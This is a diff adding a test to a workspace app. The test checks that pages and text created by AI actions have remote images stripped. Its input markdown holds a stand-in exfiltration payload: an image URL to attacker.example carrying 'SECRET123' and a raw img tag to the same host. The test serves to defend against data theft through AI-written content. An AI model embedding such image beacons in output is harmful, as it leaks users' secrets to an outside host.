@@ -157,3 +157,21 @@ test("task HTML escapes text and carries assignee and due date", () => {
   const html = tasksHtml([{ text: "<b>A</b> & B", assignee: ben.id, due: "2026-01-02" }], () => "Ben");
   assert.equal(html, `<ul data-type="taskList"><li data-type="taskItem" data-checked="false" data-due="2026-01-02"><p>&lt;b&gt;A&lt;/b&gt; &amp; B <span data-mention="${ben.id}">@Ben</span></p></li></ul>`);
 });
+
+test("pages and text written by AI actions keep no remote images", () => {
+  const markdown = "Summary\n\n![x](https://attacker.example/c?d=SECRET123)\n\n<img src=https://attacker.example/raw>\n\n[Quelle](https://example.org/a)";
+  const { results } = runActions(ben, {
+    workspaceId: wid,
+    actions: [
+      { tool: "create_page", spaceId: space, title: "Mit Bild", markdown },
+      { tool: "append_text", pageId: doc, markdown },
+    ],
+  });
+  assert.deepEqual(results.map((r) => r.ok), [true, true]);
+  for (const pageId of [results[0].pageId!, doc]) {
+    const html = one<{ html: string }>("SELECT html FROM documents WHERE page_id=?", pageId)!.html;
+    assert.doesNotMatch(html, /<img/i, "no image element");
+    assert.doesNotMatch(html, /SECRET123/, "the image address is gone (raw HTML stays text)");
+    assert.match(html, /href="https:\/\/example\.org\/a"/, "links stay");
+  }
+});
